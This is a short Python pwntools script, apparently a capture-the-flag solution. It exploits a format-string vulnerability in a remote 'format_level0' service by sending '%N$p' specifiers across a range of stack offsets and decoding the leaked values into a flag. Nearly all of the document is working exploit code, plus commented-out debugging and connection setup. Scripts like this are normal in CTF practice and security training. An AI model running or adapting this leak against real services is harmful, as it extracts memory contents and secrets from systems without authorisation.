from pwn import * 
from pwn import p64


context(arch='i386',os = 'linux')
# context(arch='amd64',os = 'linux', log_level='DEBUG')
# if debug:
#     context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
#     r = process("./format_level0")
    
# else:
#     host = "192.168.0.111:24154"
#     r = connect(host.split(':')[0],host.split(':')[1])#远程连接
#     gdb_is =0

# if gdb_is:
#     # r = gdb.debug("./format_level0",'b get_name')
#     gdb.attach(r,'b get_key')
#     # gdb.attach(r)
#     pause()
#     pass

flag = ''
# elf = ELF('./pwn')
for i in range(7,20):
    fmtstr_hand = f'%{i}$p'
    host = "192.168.0.111:26603"
    r = connect(host.split(':')[0],host.split(':')[1])#远程连接
    # r = process('./format_level0')
    r.sendafter(b'name:\n',fmtstr_hand.encode())
    context = r.recv()
    try:
        data = bytes.fromhex(context[context.find(b'0x')+2:].decode()).decode()[::-1]
        flag += data
        time.sleep(1)

    except ValueError:
        continue

print(flag)